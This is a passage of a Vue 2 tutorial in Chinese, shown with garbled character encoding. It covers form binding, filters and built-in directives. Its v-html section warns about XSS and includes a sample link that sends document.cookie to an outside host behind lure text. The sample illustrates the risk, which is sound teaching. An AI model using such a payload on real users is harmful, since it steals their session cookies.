class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;study&quot;</span>&gt;</span><br>    æ‰“æ¸¸æˆ<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;game&quot;</span>&gt;</span><br>    åƒé¥­<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;eat&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    æ‰€å±æ ¡åŒº<br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.city&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>è¯·é€‰æ‹©æ ¡åŒº<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;beijing&quot;</span>&gt;</span>åŒ—äº¬<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;shanghai&quot;</span>&gt;</span>ä¸Šæµ·<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;shenzhen&quot;</span>&gt;</span>æ·±åœ³<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;wuhan&quot;</span>&gt;</span>æˆéƒ½<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    å…¶ä»–ä¿¡æ¯ï¼š<br>    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">v-model.lazy</span>=<span class="hljs-string">&quot;userInfo.other&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.agree&quot;</span>&gt;</span>é˜…è¯»å¹¶æ¥å—<br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.yuque.com/cessstudy&quot;</span>&gt;</span>ã€Šç”¨æˆ·åè®®ã€‹<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">userInfo</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">account</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;female&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">hobby</span>: [],</span><br><span class="language-javascript">        <span class="hljs-attr">city</span>: <span class="hljs-string">&#x27;beijing&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">other</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">agree</span>: <span class="hljs-string">&#x27;&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">demo</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">userInfo</span>))</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-16-è¿‡æ»¤å™¨ï¼ˆéé‡ç‚¹-Vue3å·²ç§»é™¤"><a href="#1-16-è¿‡æ»¤å™¨ï¼ˆéé‡ç‚¹-Vue3å·²ç§»é™¤" class="headerlink" title="1.16 è¿‡æ»¤å™¨ï¼ˆéé‡ç‚¹,Vue3å·²ç§»é™¤)"></a>1.16 <del>è¿‡æ»¤å™¨</del>ï¼ˆéé‡ç‚¹,Vue3å·²ç§»é™¤)</h2><p>å®šä¹‰ï¼šå¯¹è¦æ˜¾ç¤ºçš„æ•°æ®è¿›è¡Œç‰¹å®šæ ¼å¼åŒ–åå†æ˜¾ç¤ºï¼ˆé€‚ç”¨äºä¸€äº›ç®€å•é€»è¾‘çš„å¤„ç†ï¼‰</p><ul><li><p>æ³¨å†Œè¿‡æ»¤å™¨ï¼š</p><ul><li><p>Vue.filter(name, callback)å…¨å±€è¿‡æ»¤å™¨</p></li><li><p>new Vue {filters: {}} å±€éƒ¨è¿‡æ»¤å™¨</p></li></ul></li><li><p>ä½¿ç”¨è¿‡æ»¤å™¨ï¼š<code>&#123;&#123; xxx | è¿‡æ»¤å™¨å&#125;&#125;</code>æˆ– v-bind:å±æ€§ &#x3D; â€œxxx | è¿‡æ»¤å™¨åâ€<br>å¤‡æ³¨ï¼š</p><ul><li><p>è¿‡æ»¤å™¨å¯ä»¥æ¥æ”¶é¢å¤–å‚æ•°ï¼Œå¤šä¸ªè¿‡æ»¤å™¨ä¹Ÿå¯ä»¥ä¸²è”</p></li><li><p>å¹¶æ²¡æœ‰æ”¹å˜åŸæœ¬çš„æ•°æ®ï¼Œè€Œæ˜¯äº§ç”Ÿæ–°çš„å¯¹åº”çš„æ•°æ®</p></li></ul></li></ul><p>å¤„ç†æ—¶é—´çš„åº“momentä½“ç§¯è¾ƒå¤§ dayjsè½»é‡çº§</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>è¿‡æ»¤å™¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æ—¶é—´<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å½“å‰æ—¶é—´æˆ³ï¼š&#123;&#123;time&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>è½¬æ¢åæ—¶é—´ï¼š&#123;&#123;time | timeFormater()&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>è½¬æ¢åæ—¶é—´ï¼š&#123;&#123;time | timeFormater(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æˆªå–å¹´æœˆæ—¥ï¼š&#123;&#123;time | timeFormater() | mySlice&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"><span class="hljs-comment">// å…¨å±€è¿‡æ»¤å™¨</span></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-string">&#x27;mySlice&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> value.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">11</span>)</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">time</span>:<span class="hljs-number">1626750147900</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript"><span class="hljs-comment">// å±€éƒ¨è¿‡æ»¤å™¨</span></span><br><span class="language-javascript">            <span class="hljs-attr">filters</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">timeFormater</span>(<span class="hljs-params">value, str=<span class="hljs-string">&quot;YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss&quot;</span></span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> <span class="hljs-title function_">dayjs</span>(value).<span class="hljs-title function_">format</span>(str)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>å¤‡æ³¨ï¼š</p><p>1.è¿‡æ»¤å™¨ä¹Ÿå¯ä»¥æ¥æ”¶é¢å¤–å‚æ•°ã€å¤šä¸ªè¿‡æ»¤å™¨ä¹Ÿå¯ä»¥ä¸²è”</p><p>2.å¹¶æ²¡æœ‰æ”¹å˜åŸæœ¬çš„æ•°æ®, æ˜¯äº§ç”Ÿæ–°çš„å¯¹åº”çš„æ•°æ®</p></blockquote><h2 id="1-17-å†…ç½®æŒ‡ä»¤"><a href="#1-17-å†…ç½®æŒ‡ä»¤" class="headerlink" title="1.17 å†…ç½®æŒ‡ä»¤"></a>1.17 å†…ç½®æŒ‡ä»¤</h2><p>ä¹‹å‰å­¦è¿‡çš„æŒ‡ä»¤ï¼š </p><ul><li>v-bindå•å‘ç»‘å®šè§£æè¡¨è¾¾å¼ï¼Œå¯ç®€å†™ä¸º:</li><li>v-modelåŒå‘æ•°æ®ç»‘å®š</li><li>v-foréå†æ•°ç»„ &#x2F; å¯¹è±¡ &#x2F; å­—ç¬¦ä¸²</li><li>v-onç»‘å®šäº‹ä»¶ç›‘å¬ï¼Œå¯ç®€å†™ä¸º<code>@</code></li><li>v-showæ¡ä»¶æ¸²æŸ“ (åŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å±•ç¤º)</li><li>v-ifæ¡ä»¶æ¸²æŸ“ï¼ˆåŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å­˜å­˜åœ¨ï¼‰</li><li>v-else-ifæ¡ä»¶æ¸²æŸ“ï¼ˆåŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å­˜å­˜åœ¨ï¼‰</li><li>v-elseæ¡ä»¶æ¸²æŸ“ï¼ˆåŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å­˜å­˜åœ¨ï¼‰</li></ul><p><strong>v-textæŒ‡ä»¤ ï¼š</strong>(ä½¿ç”¨çš„æ¯”è¾ƒå°‘)</p><p>1.ä½œç”¨ï¼šå‘å…¶æ‰€åœ¨çš„èŠ‚ç‚¹ä¸­æ¸²æŸ“æ–‡æœ¬å†…å®¹ã€‚</p><p>2.ä¸æ’å€¼è¯­æ³•çš„åŒºåˆ«ï¼šv-textä¼šæ›¿æ¢æ‰èŠ‚ç‚¹ä¸­çš„å†…å®¹ï¼Œ<code>&#123;&#123;xx&#125;&#125;</code>åˆ™ä¸ä¼šã€‚</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-textæŒ‡ä»¤<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>ä½ å¥½ï¼Œ&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;str&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">      <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;cess&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">str</span>:<span class="hljs-string">&#x27;&lt;h3&gt;ä½ å¥½å•Šï¼&lt;/h3&gt;&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>v-htmlæŒ‡ä»¤ ï¼š</strong>(ä½¿ç”¨çš„å¾ˆå°‘)</p><p>1.ä½œç”¨ï¼šå‘æŒ‡å®šèŠ‚ç‚¹ä¸­æ¸²æŸ“åŒ…å«htmlç»“æ„çš„å†…å®¹ã€‚</p><p>2.ä¸æ’å€¼è¯­æ³•çš„åŒºåˆ«ï¼š</p><ul><li>v-htmlä¼šæ›¿æ¢æ‰èŠ‚ç‚¹ä¸­æ‰€æœ‰çš„å†…å®¹ï¼Œ<code>&#123;&#123;xx&#125;&#125;</code>åˆ™ä¸ä¼šã€‚</li><li>v-htmlå¯ä»¥è¯†åˆ«htmlç»“æ„ã€‚</li></ul><p>3.ä¸¥é‡æ³¨æ„ï¼šv-htmlæœ‰å®‰å…¨æ€§é—®é¢˜ï¼ï¼ï¼ï¼</p><ul><li><p>åœ¨ç½‘ç«™ä¸ŠåŠ¨æ€æ¸²æŸ“ä»»æ„HTMLæ˜¯éå¸¸å±é™©çš„ï¼Œå®¹æ˜“å¯¼è‡´<a href="https://so.csdn.net/so/search?spm=1000.2115.3001.4498&q=XSS&t=&u=">XSS</a>æ”»å‡»ã€‚</p></li><li><p>ä¸€å®šè¦åœ¨å¯ä¿¡çš„å†…å®¹ä¸Šä½¿ç”¨v-htmlï¼Œæ°¸ä¸è¦ç”¨åœ¨ç”¨æˆ·æäº¤çš„å†…å®¹ä¸Šï¼</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-htmlæŒ‡ä»¤<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>ä½ å¥½ï¼Œ&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">&quot;str&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">&quot;str2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">  Vue.config.productionTip = FontFaceSetLoadEvent</span></span><br><span class="language-xml"><span class="language-handlebars">  new Vue(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    el:&#x27;#root&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    data:&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">      name:&#x27;cess&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">      str:&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ä½ å¥½å•Šï¼<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">      str2:&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:location.href</span>=<span class="hljs-string">&quot;http://www.baidu.com?&quot;</span>+<span class="hljs-attr">document.cookie</span>&gt;</span>å…„å¼Ÿæˆ‘æ‰¾åˆ°ä½ æƒ³è¦çš„èµ„æºäº†ï¼Œå¿«æ¥ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>v-cloakæŒ‡ä»¤ ï¼ˆæ²¡æœ‰å€¼ï¼‰ï¼š</strong></p><ul><li><p>æœ¬è´¨æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼ŒVueå®ä¾‹åˆ›å»ºå®Œæ¯•å¹¶æ¥ç®¡å®¹å™¨åï¼Œä¼šåˆ æ‰v-cloakå±æ€§ã€‚</p></li><li><p>ä½¿ç”¨cssé…åˆv-cloakå¯ä»¥è§£å†³ç½‘é€Ÿæ…¢æ—¶é¡µé¢å±•ç¤ºå‡º<code>&#123;&#123;xxx&#125;&#125;</code>çš„é—®é¢˜ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-cloakæŒ‡ä»¤<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-attr">[v-cloak]</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">display</span>:none;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-cloak</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>// å¤Ÿå»¶è¿Ÿ5ç§’æ”¶åˆ°vue.js<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://localhost:8080/resource/5s/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;cess&#x27;</span>&#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>v-onceæŒ‡ä»¤ ï¼š</strong>(ç”¨çš„å°‘)</p><ul><li><p>v-onceæ‰€åœ¨èŠ‚ç‚¹åœ¨åˆæ¬¡åŠ¨æ€æ¸²æŸ“åï¼Œå°±è§†ä¸ºé™æ€å†…å®¹äº†ã€‚</p></li><li><p>ä»¥åæ•°æ®çš„æ”¹å˜ä¸ä¼šå¼•èµ·v-onceæ‰€åœ¨ç»“æ„çš„æ›´æ–°ï¼Œå¯ä»¥ç”¨äºä¼˜åŒ–æ€§èƒ½ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-onceæŒ‡ä»¤<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span 